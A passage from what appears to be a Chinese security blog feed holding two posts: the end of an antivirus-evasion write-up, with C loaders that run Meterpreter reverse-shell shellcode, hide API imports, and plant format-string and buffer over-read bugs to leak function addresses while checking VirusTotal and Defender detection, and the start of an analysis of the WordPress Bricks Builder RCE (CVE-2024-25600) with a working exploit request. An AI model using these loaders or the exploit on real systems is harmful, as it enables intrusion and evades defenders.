PAGE_READWRITE);</span><br><span class="line">    if (allocatedMemory == NULL) &#123;</span><br><span class="line">        printf(&quot;[-] VirtualAlloc failed. Error: %d\n&quot;, GetLastError());</span><br><span class="line">        return -1;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 拷贝内存</span><br><span class="line">    CopyMemory(allocatedMemory, shellcode, sizeof(shellcode));</span><br><span class="line"></span><br><span class="line">    // 修改内存属性</span><br><span class="line">    DWORD oldProtect;</span><br><span class="line">    if (!VirtualProtect(allocatedMemory, sizeof(shellcode), PAGE_EXECUTE_READWRITE, &amp;oldProtect)) &#123;</span><br><span class="line">        printf(&quot;[-] VirtualProtect failed. Error: %d\n&quot;, GetLastError());</span><br><span class="line">        return -1;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 创建线程执行</span><br><span class="line">    HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)allocatedMemory, NULL, 0, NULL);</span><br><span class="line">    if (hThread == NULL) &#123;</span><br><span class="line">        printf(&quot;[-] CreateThread failed. Error: %d\n&quot;, GetLastError());</span><br><span class="line">        return -1;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 等待线程完成</span><br><span class="line">    WaitForSingleObject(hThread, INFINITE);</span><br><span class="line">    CloseHandle(hThread);</span><br><span class="line"></span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上述代码编译执行后，Meterpreter可成功收到反连，如下图<br><img src="/2025/07/28/%E5%88%A9%E7%94%A8NtReadVirtualMemory%E5%AE%9E%E7%8E%B0IAT%E4%B8%AD%E8%A7%84%E9%81%BF%E9%AB%98%E5%8D%B1API/01.png" alt="image">  </p><p>通过<a href="https://github.com/hasherezade/pe-bear">PE-bear</a>查看，可以看到IAT中存在之前用到的几个Win32 API，如下图<br><img src="/2025/07/28/%E5%88%A9%E7%94%A8NtReadVirtualMemory%E5%AE%9E%E7%8E%B0IAT%E4%B8%AD%E8%A7%84%E9%81%BF%E9%AB%98%E5%8D%B1API/02.png" alt="image">  </p><h2 id="LoadLibrary、GetProcAddress"><a href="#LoadLibrary、GetProcAddress" class="headerlink" title="LoadLibrary、GetProcAddress"></a>LoadLibrary、GetProcAddress</h2><p>然后进化出通过LoadLibrary、GetProcAddress实现的动态API调用，代码中包含注释，可以看到每条语句的含义</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;Windows.h&gt;</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">// msfvenom -p windows/meterpreter/reverse_https lhost=xxx lport=xxx -f c</span><br><span class="line">unsigned char buf[] =</span><br><span class="line">&quot;\xfc\xe8\x8f\x00\x00\x00\x60\x31\xd2\x89\xe5\x64\x8b\x52&quot;</span><br><span class="line">...</span><br><span class="line">&quot;\x30\x2e\x32\x00\xbb\xf0\xb5\xa2\x56\x6a\x00\x53\xff\xd5&quot;;</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    // 载入kernel32.dll</span><br><span class="line">    HMODULE hKernel32 = LoadLibraryA(&quot;kernel32.dll&quot;);</span><br><span class="line">    if (!hKernel32) &#123;</span><br><span class="line">        printf(&quot;LoadLibraryA failed. Error: %d&quot;, GetLastError());</span><br><span class="line">        return -1;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    // 声明一个函数指针，指定调用约定、参数、返回值符合VirtualAlloc的原型</span><br><span class="line">    LPVOID (WINAPI *pVirtualAlloc)(LPVOID, SIZE_T, DWORD, DWORD) = (LPVOID (WINAPI*)(LPVOID, SIZE_T, DWORD, DWORD))GetProcAddress(hKernel32, &quot;VirtualAlloc&quot;);</span><br><span class="line"></span><br><span class="line">    // 声明一个函数指针，指定调用约定、参数、返回值符合RtlMoveMemory的原型</span><br><span class="line">    VOID (WINAPI *pRtlMoveMemory)(VOID UNALIGNED*, const VOID UNALIGNED*, SIZE_T) = (VOID (WINAPI*)(VOID UNALIGNED*, const VOID UNALIGNED*, SIZE_T))GetProcAddress(hKernel32, &quot;RtlMoveMemory&quot;);</span><br><span class="line"></span><br><span class="line">    // 声明一个函数指针，指定调用约定、参数、返回值符合VirtualProtect的原型</span><br><span class="line">    BOOL (WINAPI *pVirtualProtect)(LPVOID, SIZE_T, DWORD, PDWORD) = (BOOL (WINAPI*)(LPVOID, SIZE_T, DWORD, PDWORD))GetProcAddress(hKernel32, &quot;VirtualProtect&quot;);</span><br><span class="line"></span><br><span class="line">    // 声明一个函数指针，指定调用约定、参数、返回值符合CreateThread的原型</span><br><span class="line">    HANDLE (WINAPI *pCreateThread)(LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD) =</span><br><span class="line">        (HANDLE (WINAPI*)(LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD))GetProcAddress(hKernel32, &quot;CreateThread&quot;);</span><br><span class="line"></span><br><span class="line">    // 声明一个函数指针，指定调用约定、参数、返回值符合WaitForSingleObject的原型</span><br><span class="line">    DWORD (WINAPI *pWaitForSingleObject)(HANDLE, DWORD) = (DWORD (WINAPI*)(HANDLE, DWORD))GetProcAddress(hKernel32, &quot;WaitForSingleObject&quot;);</span><br><span class="line"></span><br><span class="line">    // 声明一个函数指针，指定调用约定、参数、返回值符合CloseHandle的原型</span><br><span class="line">    BOOL (WINAPI *pCloseHandle)(HANDLE) = (BOOL (WINAPI*)(HANDLE))GetProcAddress(hKernel32, &quot;CloseHandle&quot;);</span><br><span class="line"></span><br><span class="line">  // 如果哪一个句柄值为false，表示获取失败，程序退出</span><br><span class="line">    if (!pVirtualAlloc || !pRtlMoveMemory || !pVirtualProtect || !pCreateThread || !pWaitForSingleObject || !pCloseHandle) &#123;</span><br><span class="line">        printf(&quot;GetProcAddress failed. Error: %d&quot;, GetLastError);</span><br><span class="line">        return -1;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 分配内存</span><br><span class="line">    LPVOID allocatedMemory = pVirtualAlloc(NULL, sizeof(buf), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);</span><br><span class="line"></span><br><span class="line">    // 拷贝内存</span><br><span class="line">    pRtlMoveMemory(allocatedMemory, buf, sizeof(buf));</span><br><span class="line"></span><br><span class="line">    // 修改内存属性</span><br><span class="line">    DWORD oldProtect;</span><br><span class="line">    if (!pVirtualProtect(allocatedMemory, sizeof(buf), PAGE_EXECUTE_READWRITE, &amp;oldProtect)) &#123;</span><br><span class="line">        printf(&quot;VirtualProtect failed. Error: %d&quot;, GetLastError);</span><br><span class="line">        return -1;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 创建线程执行内存</span><br><span class="line">    HANDLE hThread = pCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)allocatedMemory, NULL, 0, NULL);</span><br><span class="line">    if (hThread == NULL) &#123;</span><br><span class="line">        printf(&quot;CreateThread failed. Error: %d&quot;, GetLastError);</span><br><span class="line">        return -1;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 等待线程完成</span><br><span class="line">    pWaitForSingleObject(hThread, INFINITE);</span><br><span class="line">    pCloseHandle(hThread);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上述代码编译执行后，Meterpreter可成功收到反连，如下图<br><img src="/2025/07/28/%E5%88%A9%E7%94%A8NtReadVirtualMemory%E5%AE%9E%E7%8E%B0IAT%E4%B8%AD%E8%A7%84%E9%81%BF%E9%AB%98%E5%8D%B1API/03.png" alt="image">  </p><p>通过<a href="https://github.com/hasherezade/pe-bear">PE-bear</a>查看，可以看到IAT中不再有之前的几个Win32 API，仅有LoadLibrary、GetProcAddress，如下图<br><img src="/2025/07/28/%E5%88%A9%E7%94%A8NtReadVirtualMemory%E5%AE%9E%E7%8E%B0IAT%E4%B8%AD%E8%A7%84%E9%81%BF%E9%AB%98%E5%8D%B1API/04.png" alt="image">  </p><p>再进化后，当今动态获取函数地址主流的方式是查询PEB和EAT，这样在IAT中连GetModuleHandle、GetProcAddress也不会出现，甚至还可以遍历内存，通过特征匹配定位函数，进而动态获取函数地址，不过今天要分享的是一个好玩的东西，通过故意泄露内存地址，然后通过NtReadVirtualMemory读取内存来获取函数地址</p><h1 id="今生"><a href="#今生" class="headerlink" title="今生"></a>今生</h1><h2 id="resolve-c"><a href="#resolve-c" class="headerlink" title="resolve.c"></a>resolve.c</h2><p>首先我们有这样一个工具<a href="https://github.com/ybdt/evasion-hub/blob/master/01-%E5%87%BD%E6%95%B0%E5%9C%B0%E5%9D%80%E5%AE%9A%E4%BD%8D/%E6%81%B6%E6%84%8F%E8%BD%AF%E4%BB%B6%E9%AB%98%E7%BA%A7%E6%8A%80%E6%9C%AF%E4%B9%8B%E5%88%A9%E7%94%A8NtReadVirtualMemory%E5%AE%9E%E7%8E%B0IAT%E4%B8%AD%E8%A7%84%E9%81%BF%E9%AB%98%E5%8D%B1API/resolve.c">resolve.c</a>，传入NtReadVirtualMemory的地址、DLL名称、函数名称后，可以计算出函数地址</p><p>代码比较多我就不贴出来了，基本原理是通过Native API解析PE及PEB，进而获取DLL基址和函数地址，展开讲的话内容比较多，由于不是本篇文章的重点，先不去细究</p><p>VS2022下编译后，用法如下图</p><p><img src="/2025/07/28/%E5%88%A9%E7%94%A8NtReadVirtualMemory%E5%AE%9E%E7%8E%B0IAT%E4%B8%AD%E8%A7%84%E9%81%BF%E9%AB%98%E5%8D%B1API/09.png" alt="image"></p><p>接下来的问题是如何获得NtReadVirtualMemory的地址</p><h2 id="方式1-直接输出"><a href="#方式1-直接输出" class="headerlink" title="方式1 直接输出"></a>方式1 直接输出</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;windows.h&gt;</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">int main() &#123;</span><br><span class="line">    HMODULE hNtdll = LoadLibraryA(&quot;ntdll.dll&quot;);</span><br><span class="line">    </span><br><span class="line">    FARPROC pNtReadVirtualMemory = GetProcAddress(hNtdll, &quot;NtReadVirtualMemory&quot;);</span><br><span class="line">    </span><br><span class="line">    printf(&quot;[+] NtReadVirtualMemory address: \t0x%p\n&quot;, pNtReadVirtualMemory);</span><br><span class="line">    </span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译后执行如下</p><p><img src="/2025/07/28/%E5%88%A9%E7%94%A8NtReadVirtualMemory%E5%AE%9E%E7%8E%B0IAT%E4%B8%AD%E8%A7%84%E9%81%BF%E9%AB%98%E5%8D%B1API/05.png" alt="image"></p><p>将Leak-1.exe传到VT上，可以看到是11/72的检测率</p><p><img src="/2025/07/28/%E5%88%A9%E7%94%A8NtReadVirtualMemory%E5%AE%9E%E7%8E%B0IAT%E4%B8%AD%E8%A7%84%E9%81%BF%E9%AB%98%E5%8D%B1API/06.png" alt="image"></p><p>上面的代码太少了，很容易被检测，我们用AI生成一个C++实现的200行的任务管理器，并将上面的代码插入其中，当输入我们自定义的z时，会输出NtReadVirtualMemory的地址</p><p><img src="/2025/07/28/%E5%88%A9%E7%94%A8NtReadVirtualMemory%E5%AE%9E%E7%8E%B0IAT%E4%B8%AD%E8%A7%84%E9%81%BF%E9%AB%98%E5%8D%B1API/07.png" alt="image"></p><p>将Leak-2.exe传到VT上，可以看到是5/72的检测率，检测率降低了将近一半</p><p><img src="/2025/07/28/%E5%88%A9%E7%94%A8NtReadVirtualMemory%E5%AE%9E%E7%8E%B0IAT%E4%B8%AD%E8%A7%84%E9%81%BF%E9%AB%98%E5%8D%B1API/08.png" alt="image"></p><p>尝试用AI生成别的程序，包括涉及进程管理的控制台任务管理器、涉及文件操作的控制台学生成绩管理系统、甚至不涉及进程管理和文件操作的数学运算、C语言版本、C++版本、加上元数据，传到VT上后，至少会有2个杀毒引擎检测到，实在无奈</p><p>不过，尽管VT上显示Microsoft将其标识为恶意的，但在本地Defender中，并不会查杀</p><p><img src="/2025/07/28/%E5%88%A9%E7%94%A8NtReadVirtualMemory%E5%AE%9E%E7%8E%B0IAT%E4%B8%AD%E8%A7%84%E9%81%BF%E9%AB%98%E5%8D%B1API/10.png" alt="image"></p><h2 id="方式2-格式化字符串漏洞"><a href="#方式2-格式化字符串漏洞" class="headerlink" title="方式2 格式化字符串漏洞"></a>方式2 格式化字符串漏洞</h2><p>下述代码是一个典型的格式化字符串漏洞，使用sprintf将格式化数据写入input时，由于没有指定变量，所以会随机打印栈上的值，其中就包括上面定义的leakme1的值，也就造成了内存地址泄露</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;windows.h&gt;</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">int main() &#123;</span><br><span class="line">   HMODULE hNtdll = LoadLibraryA(&quot;ntdll.dll&quot;);</span><br><span class="line">   FARPROC pNtReadVirtualMemory = GetProcAddress(hNtdll, &quot;NtReadVirtualMemory&quot;);</span><br><span class="line">   </span><br><span class="line">   long long leakme1 = (long long) pNtReadVirtualMemory;</span><br><span class="line">   char input[100];</span><br><span class="line">   sprintf(input, &quot;%p %p %p %p\n&quot;);</span><br><span class="line">   printf(input);</span><br><span class="line">   </span><br><span class="line">   return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果直接在VS2022中编译，默认会带有各种优化，导致不能触发格式化字符串漏洞，需要使用如下命令编译</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cl FormatStringLeak.cpp /Od /Zi /RTC1</span><br></pre></td></tr></table></figure><p>执行后可以看到，输出的四个地址中，有一个是NtReadVirtualMemory的地址</p><p><img src="/2025/07/28/%E5%88%A9%E7%94%A8NtReadVirtualMemory%E5%AE%9E%E7%8E%B0IAT%E4%B8%AD%E8%A7%84%E9%81%BF%E9%AB%98%E5%8D%B1API/11.png" alt="image"></p><h2 id="方式3-栈越界读"><a href="#方式3-栈越界读" class="headerlink" title="方式3 栈越界读"></a>方式3 栈越界读</h2><p>下述代码原理和上面有点类似，字符数组buffer只有8字节，在栈上越界读，可以读到保存NtReadVirtualMemory地址的变量，之所以选择ptr[23]-ptr[16]，是经过测试发现，这几个字节保存的是NtReadVirtualMemory地址</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;windows.h&gt;</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">int main() &#123;</span><br><span class="line">   HMODULE hNtdll = LoadLibraryA(&quot;ntdll.dll&quot;);</span><br><span class="line">   FARPROC pNtReadVirtualMemory = GetProcAddress(hNtdll, &quot;NtReadVirtualMemory&quot;);</span><br><span class="line">   </span><br><span class="line">   char buffer[8] = &quot;leak&quot;;</span><br><span class="line">   long long leakme1 = (long long) pNtReadVirtualMemory;</span><br><span class="line">   unsigned char *ptr = (unsigned char *)buffer;</span><br><span class="line">   </span><br><span class="line">   for (int i = 23; i &gt;= 16; i--) &#123;</span><br><span class="line">       printf(&quot;%02X&quot;, ptr[i]); </span><br><span class="line">   &#125;</span><br><span class="line">   </span><br><span class="line">   return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用如下命令编译</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cl StackOverRead.cpp /Od /Zi /RTC1</span><br></pre></td></tr></table></figure><p>执行后可以看到，成功输出的地址</p><p><img src="/2025/07/28/%E5%88%A9%E7%94%A8NtReadVirtualMemory%E5%AE%9E%E7%8E%B0IAT%E4%B8%AD%E8%A7%84%E9%81%BF%E9%AB%98%E5%8D%B1API/12.png" alt="image"></p><h2 id="方式4-堆越界读"><a href="#方式4-堆越界读" class="headerlink" title="方式4 堆越界读"></a>方式4 堆越界读</h2><p>下述代码原理和上面的栈越界读基本一致</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;windows.h&gt;</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">int main() &#123;</span><br><span class="line">   HMODULE hNtdll = LoadLibraryA(&quot;ntdll.dll&quot;);</span><br><span class="line">   FARPROC pNtReadVirtualMemory = GetProcAddress(hNtdll, &quot;NtReadVirtualMemory&quot;);</span><br><span class="line">   </span><br><span class="line">   char *buffer = (char *)malloc(32);</span><br><span class="line">   strcpy(buffer, &quot;leak&quot;);</span><br><span class="line">   uintptr_t *leakme1 = (uintptr_t *)(buffer + 16);</span><br><span class="line">   *leakme1 = (uintptr_t)pNtReadVirtualMemory;</span><br><span class="line">   </span><br><span class="line">   for (int i = 23; i &gt;= 16; i--) &#123; printf(&quot;%02X&quot;, (unsigned char)buffer[i]); &#125;</span><br><span class="line">   </span><br><span class="line">   return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用如下命令编译</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cl HeapOverRead.cpp /Od /Zi /RTC1</span><br></pre></td></tr></table></figure><p>编译后执行，可以看到，成功输出了NtReadVirtualMemory的地址</p><p><img src="/2025/07/28/%E5%88%A9%E7%94%A8NtReadVirtualMemory%E5%AE%9E%E7%8E%B0IAT%E4%B8%AD%E8%A7%84%E9%81%BF%E9%AB%98%E5%8D%B1API/13.png" alt="image"></p><p>上述代码，结合AI生成的代码，执行后如下图</p><p><img src="/2025/07/28/%E5%88%A9%E7%94%A8NtReadVirtualMemory%E5%AE%9E%E7%8E%B0IAT%E4%B8%AD%E8%A7%84%E9%81%BF%E9%AB%98%E5%8D%B1API/14.png" alt="image"></p><p>在Defender下测试，不会被拦截</p><p><img src="/2025/07/28/%E5%88%A9%E7%94%A8NtReadVirtualMemory%E5%AE%9E%E7%8E%B0IAT%E4%B8%AD%E8%A7%84%E9%81%BF%E9%AB%98%E5%8D%B1API/15.png" alt="image"></p><h1 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h1><p>把输出的函数地址和resolve相结合，可以成功获取到NTAPI的地址</p><p><img src="/2025/07/28/%E5%88%A9%E7%94%A8NtReadVirtualMemory%E5%AE%9E%E7%8E%B0IAT%E4%B8%AD%E8%A7%84%E9%81%BF%E9%AB%98%E5%8D%B1API/16.png" alt="image"></p><p>如何更好的融入到实战中，还有待探索</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;前世&quot;&gt;&lt;a href=&quot;#前世&quot; class=&quot;headerlink&quot; title=&quot;前世&quot;&gt;&lt;/a&gt;前世&lt;/h1&gt;&lt;h2 id=&quot;Win32-API&quot;&gt;&lt;a href=&quot;#Win32-API&quot; class=&quot;headerlink&quot; title=&quot;Win32 A</summary>
      
    
    
    
    <category term="免杀研究" scheme="http://example.com/categories/%E5%85%8D%E6%9D%80%E7%A0%94%E7%A9%B6/"/>
    
    
  </entry>
  
  <entry>
    <title>CVE-2024-25600 WordPress Bricks Builder远程代码执行漏洞分析</title>
    <link href="http://example.com/2025/01/06/CVE-2024-25600-WordPress-Bricks-Builder%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    <id>http://example.com/2025/01/06/CVE-2024-25600-WordPress-Bricks-Builder%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</id>
    <published>2025-01-06T11:57:41.000Z</published>
    <updated>2025-10-09T14:25:17.741Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>朋友圈看到有人转发了一篇“CVE-2024-25600：WordPress Bricks Builder RCE”，感觉挺有意思，点进去看了下，可是从头到尾看得我有点迷糊，本着打破砂锅问到底的原则，本文试图以漏洞挖掘者的视角详细分析这个漏洞，试着讲清楚漏洞真正的成因，也在分析的过程中发现一些新的小东西，比如漏洞只影响1.9.1及之上的版本，网上都在说影响版本是&lt;=1.9.6，其实应该是1.9.1 &lt;= affected version &lt;= 1.9.6</p><p>这里想说句题外话，如果一篇文章看得你云里雾里，那不排除一种可能，这篇文章质量不高~</p><h1 id="0x01-漏洞宏观流程"><a href="#0x01-漏洞宏观流程" class="headerlink" title="0x01 漏洞宏观流程"></a>0x01 漏洞宏观流程</h1><p>漏洞最终触发点是eval执行了攻击者传入的恶意代码，导致任意代码执行<br><img src="/2025/01/06/CVE-2024-25600-WordPress-Bricks-Builder%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/01.png" alt="image"><br>其中参数$php_query_raw是攻击者可控的，路由也是攻击者可控的，最后在权限校验部分仅使用nonce进行权限校验，而nonce会泄露在前端源码中，至此《危险函数 -&gt; 用户输入 -&gt; 对应路由 -&gt; 权限绕过》全部满足，最终导致了前台RCE（实际的细节有些复杂…)</p><p>pyload如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">POST /WordPress-6.4.3/wp-json/bricks/v1/render\_element HTTP/1.1</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line">User-Agent: Mozilla/5.0 (X11; Linux x86\_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 270</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Accept-Encoding: gzip, deflate, </span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">    &quot;postId&quot;: &quot;1&quot;,</span><br><span class="line">    &quot;nonce&quot;: &quot; a980a714d9&quot;,</span><br><span class="line">    &quot;element&quot;: &#123;</span><br><span class="line">        &quot;name&quot;: &quot;container&quot;,</span><br><span class="line">        &quot;settings&quot;: &#123;</span><br><span class="line">            &quot;hasLoop&quot;: &quot;&quot;,</span><br><span class="line">            &quot;query&quot;: &#123;&quot;useQueryEditor&quot;: &quot;&quot;,&quot;queryEditor&quot;: &quot;system(&#x27;calc&#x27;);&quot;,&quot;objectType&quot;: &quot;&quot;&#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="0x02-漏洞细节流程"><a href="#0x02-漏洞细节流程" class="headerlink" title="0x02 漏洞细节流程"></a>0x02 漏洞细节流程</h1><h2 id="01-危险函数"><a href="#01-危险函数" class="headerlink" title="01 危险函数"></a>01 危险函数</h2><p>危险函数是eval，平时挖漏洞时，危险函数可以通过Seay跑一遍后发现，从代码注释中可以看到，漏洞代码是自版本1.9.1才有的<br><img src="/2025/01/06/CVE-2024-25600-WordPress-Bricks-Builder%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/0a.png" alt="image">  </p><h2 id="02-用户输入"><a href="#02-用户输入" class="headerlink" title="02 用户输入"></a>02 用户输入</h2><p>从触发点往上回溯，可看到参数$php_query_raw的值来自于bricks_render_dynamic_data( $query_vars[‘queryEditor’], $post_id )的返回值<br><img src="/2025/01/06/CVE-2024-25600-WordPress-Bricks-Builder%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/02.png" alt="image">  </p><p>ctrl+鼠标左键，进去看下bricks_render_dynamic_data对$query_vars[‘queryEditor’]和$post_id有没有什么过滤，可以看到具体实现在render_content中<br><img src="/2025/01/06/CVE-2024-25600-WordPress-Bricks-Builder%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/03.jpg" alt="image">  </p><p>继续跟进render_content，代码逻辑是：<br>如果第一个参数是数组且至少有一个元素，则直接返回第一个元素。<br>如果第一个参数中键name对应的值不为空，那么将键name对应的值赋值给第一个元素，否则将第一个参数转化为字符串类型后赋值给第一个参数。<br>如果第一个参数中不包含字符’{‘，则直接返回第一个参数。<br>如果第一个参数中包含字符串’{echo:’，那么去掉第一个参数中用来转义的反斜线。<br>如果$post_id的值为空，那么调用get_the_ID()并将返回值赋值给$post_id，否则$post_id的值不变。<br>$post_id经get_post()处理后赋值给$post。<br>将’bricks/dynamic_data/render_content’, $content, $post, $context经apply_filters处理后的返回值返回<br>（详细讲述代码逻辑太费劲了，估计看的人也费劲，后面只讲基本逻辑）<br><img src="/2025/01/06/CVE-2024-25600-WordPress-Bricks-Builder%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/04.png" alt="image">  </p><p>现在我们梳理了bricks_render_dynamic_data内部做了什么，具体返回什么值要看传入什么样的参数，回到原来的地方，Database::$page_data[‘preview_or_post_id’]跟进后值是常量0，现在变量只剩$query_vars[‘queryEditor’]，向上找$query_vars[‘queryEditor’]发现没有，只找到$query_vars，$query_vars来自方法prepare_query_vars_from_settings的第一个参数$settings，也就是说，调用prepare_query_vars_from_settings时，第一个参数$settings需要满足：$settings-&gt;[‘query’]-&gt;[‘useQueryEditor’]存在且不为null、$settings-&gt;[‘query’]-&gt;[‘queryEditor’]不为空，还有一个条件，$object_type需要是[ ‘post’,’term’,’user’ ]中的一个，$object_type来自于self::get_query_object_type()，跟进get_query_object_type，基本逻辑是：根据全局变量$bricks_loop_query的值决定返回’post’还是’’<br><img src="/2025/01/06/CVE-2024-25600-WordPress-Bricks-Builder%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/06.png" alt="image">  </p><p>ctrl+鼠标左键，看下哪些函数调用了prepare_query_vars_from_settings，可以看到只有2个，database.php和query.php，database.php看名字就知道是和数据库打交道的，如果漏洞点在这个文件中，很可能还需要一个sql注入漏洞将恶意代码注入到数据库中，所以优先选择query.php进行深入查看<br><img 